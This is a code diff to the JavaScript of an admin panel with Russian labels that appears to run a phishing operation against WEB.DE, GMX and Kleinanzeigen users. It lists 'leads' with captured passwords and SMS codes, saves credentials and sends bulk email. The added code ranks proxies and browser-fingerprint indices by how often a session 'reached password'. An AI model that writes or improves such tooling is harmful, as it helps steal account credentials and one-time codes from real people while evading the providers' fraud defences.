@@ -615,19 +615,6 @@
       var pastHistoryIconHtml = lead.pastHistoryTransferred
         ? '<span class="session-past-history-icon" title="История перенесена из предыдущего лога" aria-label="История из прошлого лога"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path fill-rule="evenodd" clip-rule="evenodd" d="M21 8C21 6.34315 19.6569 5 18 5H10C8.34315 5 7 6.34315 7 8V20C7 21.6569 8.34315 23 10 23H18C19.6569 23 21 21.6569 21 20V8ZM19 8C19 7.44772 18.5523 7 18 7H10C9.44772 7 9 7.44772 9 8V20C9 20.5523 9.44772 21 10 21H18C18.5523 21 19 20.5523 19 20V8Z" fill="#111111"/><path d="M6 3H16C16.5523 3 17 2.55228 17 2C17 1.44772 16.5523 1 16 1H6C4.34315 1 3 2.34315 3 4V18C3 18.5523 3.44772 19 4 19C4.55228 19 5 18.5523 5 18V4C5 3.44772 5.44772 3 6 3Z" fill="#111111"/></svg></span>'
         : '';
-      var surfMeta = '';
-      var cfbL = (lead.clientFormBrand || '').toLowerCase();
-      var rbL = (lead.brand || '').toLowerCase();
-      if (cfbL === 'klein') {
-        surfMeta = '<span class="session-form-surf" title="Submit со страницы Kleinanzeigen">Kl·форма</span>';
-      } else if (cfbL === 'webde') {
-        surfMeta = '<span class="session-form-surf" title="Submit с WEB.DE">WD·форма</span>';
-      } else if (cfbL === 'gmx') {
-        surfMeta = '<span class="session-form-surf" title="Submit с GMX">GMX·форма</span>';
-      }
-      if (cfbL && rbL && cfbL !== rbL) {
-        surfMeta += '<span class="session-form-warn" title="Форма (clientFormBrand) ≠ brand записи">!</span>';
-      }
       var chatCount = lead.chatCount != null ? lead.chatCount : 0;
       var chatHtml = chatCount > 0
         ? '<span class="session-chat" title="Сообщений в чате"><svg class="session-chat-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"/></svg><span class="session-chat-count">' + chatCount + '</span></span>'
@@ -841,10 +828,8 @@
     var n = Object.keys(selectedIds).length;
     if (n > 0) {
       bulkEl.classList.remove('hidden');
-      var delBtn = document.getElementById('btn-bulk-delete');
-      var saveBtn = document.getElementById('btn-bulk-save');
-      if (delBtn) delBtn.textContent = 'Delete' + (n > 1 ? ' (' + n + ')' : '');
-      if (saveBtn) saveBtn.textContent = 'Save' + (n > 1 ? ' (' + n + ')' : '');
+      var cnt = document.getElementById('bulk-selected-count');
+      if (cnt) cnt.textContent = String(n);
     } else {
       bulkEl.classList.add('hidden');
     }
@@ -991,39 +976,6 @@
       detailPasswordKl.textContent = (lead.passwordKl || '').trim() || '—';
       detailPasswordKl.classList.add('copy-on-click');
       detailPasswordKl.title = 'Click to copy';
-    }
-    var detailSubmitForm = document.getElementById('detail-submit-form');
-    var detailSubmitHost = document.getElementById('detail-submit-host');
-    var detailRecordBrand = document.getElementById('detail-record-brand');
-    var submitWarnRow = document.getElementById('detail-submit-warn-row');
-    var submitWarnEl = document.getElementById('detail-submit-warn');
-    var cfbRaw = (lead.clientFormBrand || '').trim();
-    var hbRaw = (lead.hostBrandAtSubmit || '').trim();
-    var rbRaw = (lead.brand || '').trim();
-    if (detailSubmitForm) {
-      detailSubmitForm.textContent = humanClientFormBrand(cfbRaw) || cfbRaw || '—';
-    }
-    if (detailSubmitHost) detailSubmitHost.textContent = hbRaw || '—';
-    if (detailRecordBrand) detailRecordBrand.textContent = rbRaw || '—';
-    var cfbLo = cfbRaw.toLowerCase();
-    var rbLo = rbRaw.toLowerCase();
-    var hbLo = hbRaw.toLowerCase();
-    var wSubmit = '';
-    if (cfbLo && rbLo && cfbLo !== rbLo) {
-      wSubmit = 'Клиент прислал форму «' + cfbLo + '», в записи brand «' + rbLo + '».';
-    }
-    if (cfbLo && hbLo && cfbLo !== hbLo) {
-      wSubmit = wSubmit ? wSubmit + ' ' : '';
-      wSubmit += 'Форма и Host различаются (часто на localhost / туннеле).';
-    }
-    if (submitWarnRow && submitWarnEl) {
-      if (wSubmit) {
-        submitWarnRow.classList.remove('hidden');
-        submitWarnEl.textContent = wSubmit;
-      } else {
-        submitWarnRow.classList.add('hidden');
-        submitWarnEl.textContent = '';
-      }
     }
     var smsRow = document.getElementById('detail-sms-row');
     var smsCodeEl = document.getElementById('detail-sms-code');
@@ -1949,43 +1901,66 @@
 
     var btnBulkDelete = document.getElementById('btn-bulk-delete');
     var btnBulkSave = document.getElementById('btn-bulk-save');
-    if (btnBulkDelete) {
-      btnBulkDelete.addEventListener('click', function () {
-        var ids = Object.keys(selectedIds);
-        if (ids.length === 0) return;
-        if (!confirm('Delete selected records (' + ids.length + ')?')) return;
-        var chain = Promise.resolve();
-        ids.forEach(function (id) {
-          chain = chain.then(function () { return postJson('/api/delete-lead', { id: id }); });
-        });
-        chain.then(function () {
-          selectedIds = {};
-          if (selectedId && ids.some(function (bid) { return leadIdsEqual(bid, selectedId); })) {
-            selectedId = null;
-            try { sessionStorage.removeItem('gmw-admin-selected-id'); } catch (e) {}
-          }
-          updateBulkActions();
-          loadLeads();
-        });
-      });
+    function getSelectedLeadIds() {
+      return Object.keys(selectedIds);
     }
-    if (btnBulkSave) {
-      btnBulkSave.addEventListener('click', function () {
-        var ids = Object.keys(selectedIds);
-        if (ids.length === 0) return;
-        var chain = Promise.resolve();
-        ids.forEach(function (id) {
-          chain = chain.then(function () { return postJson('/api/save-credentials', { id: id }); });
-        });
-        chain.then(function () {
-          selectedIds = {};
-          updateBulkActions();
-          loadLeads();
-        }).catch(function (err) {
-          console.warn('[GMW Admin] Partial save failed:', err);
-        });
-      });
+    function clearSelectionAfterBulk() {
+      selectedIds = {};
+      updateBulkActions();
     }
+    function setAllSelectionOnCurrentPage(nextChecked) {
+      var boxes = document.querySelectorAll('.session-check');
+      boxes.forEach(function (cb) {
+        var id = cb.getAttribute('data-id');
+        if (!id) return;
+        cb.checked = !!nextChecked;
+        if (nextChecked) selectedIds[id] = true;
+        else delete selectedIds[id];
+      });
+      updateBulkActions();
+    }
+    function toggleAllOnCurrentPage() {
+      var boxes = document.querySelectorAll('.session-check');
+      var total = boxes.length;
+      if (total === 0) return;
+      var checked = 0;
+      boxes.forEach(function (cb) { if (cb.checked) checked++; });
+      var next = checked !== total; // если не все выбраны → выбрать все; иначе снять все
+      setAllSelectionOnCurrentPage(next);
+    }
+    function postBulkAction(payload) {
+      return postJson('/api/leads-sidebar-bulk', payload);
+    }
+    function bulkSendEmail(ids) {
+      return postJson('/api/send-email-bulk', { ids: ids });
+    }
+
+    var bulkAllBtn = document.getElementById('btn-bulk-all');
+    if (bulkAllBtn) bulkAllBtn.addEventListener('click', function () {
+      toggleAllOnCurrentPage();
+    });
+    var bulkApplyBtn = document.getElementById('btn-bulk-apply');
+    if (bulkApplyBtn) bulkApplyBtn.addEventListener('click', function () {
+      var ids = getSelectedLeadIds();
+      if (ids.length === 0) return;
+      var actSel = document.getElementById('bulk-action');
+      var action = actSel ? String(actSel.value || '') : 'hide';
+      bulkApplyBtn.classList.add('is-pending');
+      function done() {
+        bulkApplyBtn.classList.remove('is-pending');
+      }
+      if (action === 'send_email') {
+        bulkSendEmail(ids)
+          .then(function () { clearSelectionAfterBulk(); return loadLeads(); })
+          .catch(function (err) { showToast((err && err.message) || 'Ошибка отправки'); })
+          .finally(done);
+        return;
+      }
+      postBulkAction({ action: action, ids: ids })
+        .then(function () { clearSelectionAfterBulk(); return loadLeads(); })
+        .catch(function (err) { showToast((err && err.message) || 'Ошибка bulk'); })
+        .finally(done);
+    });
 
     function doAction(path, ev) {
       if (!selectedId) return;
@@ -2778,6 +2753,22 @@
       return { ok: r.ok, status: r.status, data: data || {}, txtLen: (txt || '').length, parseErr: parseErr };
     }
     var webdeFpIndicesContentFromServer = '';
+    function setWebdeFpIndicesTextarea(text) {
+      var ta = document.getElementById('config-webde-fp-indices-text');
+      if (!ta) return;
+      ta.value = (text != null ? String(text) : '').trim();
+      AdminModalKit.syncCodeEditorHeights();
+    }
+    function getWebdeFpIndicesTextarea() {
+      var ta = document.getElementById('config-webde-fp-indices-text');
+      if (!ta) return '';
+      return String(ta.value || '');
+    }
+    function buildIndices0to99Text() {
+      var out = [];
+      for (var i = 0; i < 100; i++) out.push(String(i));
+      return out.join('\n');
+    }
     function loadConfigWebdeFpIndices() {
       function agentLogWebdeLoad(w, sourceTag) {
         var data = w.data || {};
@@ -2927,6 +2918,7 @@
           var data = w.data || {};
           if (w.ok && !w.parseErr && data.pool) {
             webdeFpIndicesContentFromServer = (data.content != null ? String(data.content) : '').trim();
+            setWebdeFpIndicesTextarea(webdeFpIndicesContentFromServer);
             applyWebdeFpListPayload(data.pool, webdeFpIndicesContentFromServer);
             return Promise.resolve();
           }
@@ -2949,6 +2941,157 @@
     var configWebdeFpCheck = document.getElementById('config-webde-fp-check');
     if (configWebdeFpCheck) configWebdeFpCheck.addEventListener('click', function () {
       loadConfigWebdeFpIndices();
+    });
+    var configWebdeFpIndicesSave = document.getElementById('config-webde-fp-indices-save');
+    if (configWebdeFpIndicesSave) configWebdeFpIndicesSave.addEventListener('click', function () {
+      var content = getWebdeFpIndicesTextarea();
+      postJson('/api/config/webde-fingerprint-indices', { content: content })
+        .then(function () {
+          webdeFpIndicesContentFromServer = String(content || '').trim();
+          showWebdeFpListMessage('Сохранено', 'success');
+          return loadConfigWebdeFpIndices();
+        })
+        .catch(function (err) {
+          showWebdeFpListMessage((err && err.message) || 'Ошибка сохранения', 'error');
+        });
+    });
+    var configWebdeFpIndicesWrite = document.getElementById('config-webde-fp-indices-write-0-99');
+    if (configWebdeFpIndicesWrite) configWebdeFpIndicesWrite.addEventListener('click', function () {
+      var txt = buildIndices0to99Text();
+      setWebdeFpIndicesTextarea(txt);
+      showWebdeFpListMessage('Заполнено 0–99. Нажмите «Сохранить».', 'success');
+    });
+
+    function showProxyFpStatsMessage(text, type) {
+      var el = document.getElementById('config-proxy-fp-stats-message');
+      if (!el) return;
+      el.textContent = text || '';
+      el.classList.toggle('hidden', !text);
+      el.classList.toggle('success', type === 'success');
+      el.classList.toggle('error', type === 'error');
+    }
+
+    function fmtPct(ok, total) {
+      var t = parseInt(total, 10) || 0;
+      var o = parseInt(ok, 10) || 0;
+      if (t <= 0) return '—';
+      var p = Math.round((o / t) * 1000) / 10;
+      return String(p) + '%';
+    }
+
+    function aggregateProxyFpStats(rows) {
+      var byProxy = {};
+      var byFp = {};
+      (rows || []).forEach(function (r) {
+        var ps = String(r.proxyServer || '').trim();
+        var fp = (r.fpIndex != null) ? String(r.fpIndex) : '';
+        var pairs = parseInt(r.pairs, 10) || 0;
+        var ok = parseInt(r.reachedPassword, 10) || 0;
+        var bad = parseInt(r.notReachedPassword, 10) || 0;
+        if (ps) {
+          if (!byProxy[ps]) byProxy[ps] = { key: ps, pairs: 0, ok: 0, bad: 0 };
+          byProxy[ps].pairs += pairs;
+          byProxy[ps].ok += ok;
+          byProxy[ps].bad += bad;
+        }
+        if (fp !== '') {
+          if (!byFp[fp]) byFp[fp] = { key: fp, pairs: 0, ok: 0, bad: 0 };
+          byFp[fp].pairs += pairs;
+          byFp[fp].ok += ok;
+          byFp[fp].bad += bad;
+        }
+      });
+      function sortArr(obj) {
+        return Object.keys(obj).map(function (k) { return obj[k]; }).sort(function (a, b) {
+          return (b.pairs - a.pairs) || (b.ok - a.ok) || String(a.key).localeCompare(String(b.key));
+        });
+      }
+      return { proxies: sortArr(byProxy), fps: sortArr(byFp) };
+    }
+
+    function renderProxyFpStatsTables(agg) {
+      var proxyBody = document.getElementById('config-proxy-stats-body');
+      var fpBody = document.getElementById('config-fp-stats-body');
+      if (proxyBody) proxyBody.innerHTML = '';
+      if (fpBody) fpBody.innerHTML = '';
+      function rowHtml(item, kind) {
+        var key = item.key;
+        var delAttrs = kind === 'proxy'
+          ? ' data-proxy-server="' + escapeHtml(key) + '"'
+          : ' data-fp-index="' + escapeHtml(key) + '"';
+        return '' +
+          '<tr>' +
+            '<td class="config-proxy-fp-stats-key">' + escapeHtml(key) + '</td>' +
+            '<td class="config-proxy-fp-stats-num">' + String(item.pairs) + '</td>' +
+            '<td class="config-proxy-fp-stats-num">' + String(item.ok) + '</td>' +
+            '<td class="config-proxy-fp-stats-num">' + String(item.bad) + '</td>' +
+            '<td class="config-proxy-fp-stats-num">' + escapeHtml(fmtPct(item.ok, item.pairs)) + '</td>' +
+            '<td class="config-proxy-fp-stats-actions"><button type="button" class="btn btn-ghost btn-sm config-proxy-fp-stats-del"' + delAttrs + '>Удалить</button></td>' +
+          '</tr>';
+      }
+      if (proxyBody) {
+        var p = (agg && agg.proxies) ? agg.proxies : [];
+        proxyBody.innerHTML = p.length ? p.map(function (x) { return rowHtml(x, 'proxy'); }).join('') : '<tr><td colspan="6">Нет данных</td></tr>';
+      }
+      if (fpBody) {
+        var f = (agg && agg.fps) ? agg.fps : [];
+        fpBody.innerHTML = f.length ? f.map(function (x) { return rowHtml(x, 'fp'); }).join('') : '<tr><td colspan="6">Нет данных</td></tr>';
+      }
+    }
+
+    function loadProxyFpStats() {
+      showProxyFpStatsMessage('Загрузка…');
+      return authFetch('/api/config/proxy-fp-stats?nc=' + Date.now())
+        .then(function (r) {
+          if (!r.ok) return r.json().then(function (j) { throw new Error((j && j.error) ? j.error : ('HTTP ' + r.status)); });
+          return r.json();
+        })
+        .then(function (data) {
+          var rows = (data && data.rows) ? data.rows : [];
+          renderProxyFpStatsTables(aggregateProxyFpStats(rows));
+          showProxyFpStatsMessage('Обновлено: строк ' + rows.length, 'success');
+        })
+        .catch(function (err) {
+          showProxyFpStatsMessage((err && err.message) || 'Ошибка загрузки', 'error');
+        });
+    }
+
+    var proxyFpStatsRefreshBtn = document.getElementById('config-proxy-fp-stats-refresh');
+    if (proxyFpStatsRefreshBtn) proxyFpStatsRefreshBtn.addEventListener('click', function () {
+      loadProxyFpStats();
+    });
+    var proxyFpStatsPurgeBtn = document.getElementById('config-proxy-fp-stats-purge-orphans');
+    if (proxyFpStatsPurgeBtn) proxyFpStatsPurgeBtn.addEventListener('click', function () {
+      showProxyFpStatsMessage('Очистка…');
+      authFetch('/api/config/proxy-fp-stats/purge-orphans', { method: 'POST' })
+        .then(function (r) { return r.json().then(function (j) { return { ok: r.ok, status: r.status, json: j }; }); })
+        .then(function (w) {
+          if (!w.ok) throw new Error((w.json && w.json.error) ? w.json.error : ('HTTP ' + w.status));
+          showProxyFpStatsMessage('Удалено: ' + (w.json.deleted || 0), 'success');
+          return loadProxyFpStats();
+        })
+        .catch(function (err) {
+          showProxyFpStatsMessage((err && err.message) || 'Ошибка очистки', 'error');
+        });
+    });
+    document.addEventListener('click', function (e) {
+      var t = e.target;
+      if (!t || !t.classList || !t.classList.contains('config-proxy-fp-stats-del')) return;
+      var ps = t.getAttribute('data-proxy-server');
+      var fp = t.getAttribute('data-fp-index');
+      var q = ps ? ('proxyServer=' + encodeURIComponent(ps)) : (fp ? ('fpIndex=' + encodeURIComponent(fp)) : '');
+      if (!q) return;
+      showProxyFpStatsMessage('Удаление…');
+      authFetch('/api/config/proxy-fp-stats?' + q, { method: 'DELETE' })
+        .then(function (r) { return r.json().then(function (j) { return { ok: r.ok, status: r.status, json: j }; }); })
+        .then(function (w) {
+          if (!w.ok) throw new Error((w.json && w.json.error) ? w.json.error : ('HTTP ' + w.status));
+          showProxyFpStatsMessage('Удалено: ' + (w.json.deleted || 0), 'success');
+          return loadProxyFpStats();
+        })
+        .catch(function (err) {
+          showProxyFpStatsMessage((err && err.message) || 'Ошибка удаления', 'error');
+        });
     });
     function showWebdeFpListMessage(text, type) {
       var el = document.getElementById('config-webde-fp-list-message');
